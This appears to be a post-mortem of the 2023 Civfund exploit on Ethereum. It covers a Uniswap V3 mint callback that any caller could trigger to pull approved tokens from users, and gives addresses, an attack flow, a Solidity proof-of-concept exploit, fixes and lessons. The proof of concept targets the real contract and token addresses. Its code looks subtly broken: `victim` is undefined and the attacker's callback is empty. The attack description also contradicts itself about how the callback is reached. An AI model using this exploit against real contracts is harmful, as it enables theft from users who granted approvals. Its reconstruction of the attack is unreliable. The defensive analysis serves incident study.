# Civfund Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Civfund |
| Date | 2023-07-01 |
| Chain | Ethereum Mainnet |
| Loss | ~$165,000 USD |
| Attack Type | Missing Access Control + DEX Callback Abuse |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0xc0ccff0b981b419e6e47560c3659c5f0b00e4985` |
| Attack Contract | `0xf466f9f431aea853040ef837626b1c59cc963ce2` |
| Vulnerable Contract | `0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826` |
| Attack TX | `0xc42fc0e22a0f60cc299be80eb0c0ddce83c21c14a3dddd8430628011c3e20d6b` |
| Fork Block | 17,646,141 |

## 2. Vulnerability Code Analysis

The `mint()` callback in the Civfund contract was externally callable without any validation. By abusing `uniswapV3MintCallback()`, the attacker drained various ERC20 tokens (USDT, BONE, WOOF, LEASH, SANI, ONE, CELL, USDC, SHIB) from victim addresses.

```solidity
// Vulnerable pattern: uniswapV3MintCallback with no validation
function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external override {
    // Vulnerable: msg.sender is not verified to be a legitimate Uniswap V3 pool
    (address token0, address token1, address payer) = abi.decode(
        data, (address, address, address)
    );

    // Transfers tokens from victim (payer) without validation
    if (amount0Owed > 0) {
        IERC20(token0).transferFrom(payer, msg.sender, amount0Owed);
    }
    if (amount1Owed > 0) {
        IERC20(token1).transferFrom(payer, msg.sender, amount1Owed);
    }
}
```

**Vulnerability**: `uniswapV3MintCallback` allows arbitrary callers, enabling token theft by exploiting approvals that victims had granted to the contract.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Missing access control + DEX callback abuse
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xc0ccff0b981b419e6e47560c3659c5f0b00e4985]
  │
  ├─1─▶ Calls ICiv.mint() (vulnerable function)
  │      [Civfund: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826]
  │      → triggers uniswapV3MintCallback internally from mint()
  │
  ├─2─▶ uniswapV3MintCallback() executes
  │      payer = victim addresses
  │      token = [USDT, BONE, WOOF, LEASH, SANI, ONE, CELL, USDC, SHIB]
  │
  ├─3─▶ Transfers tokens from each victim address
  │      → transferFrom(victim, attacker, allowance)
  │
  └─4─▶ Drains various tokens and converts to ETH
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ICiv {
    function mint(address recipient, uint256 amount0Desired, uint256 amount1Desired,
        uint256 amount0Min, uint256 amount1Min, bytes calldata data) external;
}

contract CivfundExploit {
    ICiv civ = ICiv(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826);

    // Tokens to drain
    address[] tokens = [
        0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
        0x9813037ee2218799597d83D4a5B6F3b6778218d9, // BONE
        0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3, // WOOF
        0x27C70Cd1946795B66be9d954418546998b546634, // LEASH
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48  // USDC
    ];

    function testExploit() external {
        // Trigger the vulnerable callback via mint()
        bytes memory data = abi.encode(tokens[0], tokens[1], victim);
        civ.mint(
            address(this),
            type(uint256).max,  // request maximum amount
            type(uint256).max,
            0,
            0,
            data
        );
    }

    // callback is already vulnerable — this function is invoked automatically
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        // attacker contract receives the callback
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Missing access control on DEX callback, transferFrom abuse |
| Impact Scope | All users who granted unlimited approval to the protocol |
| Explorer | [Etherscan](https://etherscan.io/address/0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826) |

## 6. Security Recommendations

```solidity
// Fix 1: Restrict callback caller to a legitimate Uniswap V3 Pool
function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external override {
    CallbackData memory decoded = abi.decode(data, (CallbackData));

    // Required validation: msg.sender must be a legitimate Uniswap V3 Pool
    address expectedPool = IUniswapV3Factory(factory).getPool(
        decoded.token0, decoded.token1, decoded.fee
    );
    require(msg.sender == expectedPool, "Invalid callback caller");

    if (amount0Owed > 0) pay(decoded.token0, decoded.payer, msg.sender, amount0Owed);
    if (amount1Owed > 0) pay(decoded.token1, decoded.payer, msg.sender, amount1Owed);
}

// Fix 2: Flag-based guard using transient storage (Solidity 0.8.24+)
bytes32 private constant MINTING_SLOT = keccak256("civfund.minting");

function mint(...) external {
    assembly { tstore(MINTING_SLOT, 1) }  // set minting flag
    // ... minting logic
    assembly { tstore(MINTING_SLOT, 0) }  // clear flag
}

function uniswapV3MintCallback(...) external {
    assembly {
        if iszero(tload(MINTING_SLOT)) { revert(0, 0) }  // only allowed during minting
    }
    // ...
}
```

## 7. Lessons Learned

1. **Uniswap V3 Callback Security Pattern**: The callback pattern from the official Uniswap V3 PeripheryPayments contract must be followed. Verifying that `msg.sender` is a valid pool is essential.
2. **Multi-Token Impact**: A single access control vulnerability can lead to losses across all tokens approved to the protocol. All tokens within the protocol's scope must be audited.
3. **Unlimited Approval Risk**: A user's `approve(type(uint256).max)` pattern carries a full-drain risk when combined with a vulnerable contract. Approving only the required amount is the safer pattern.
4. **Minting Context Validation**: Minting callbacks must be protected with transient storage or a reentrancy guard so they can only be invoked within the context of an actual minting transaction.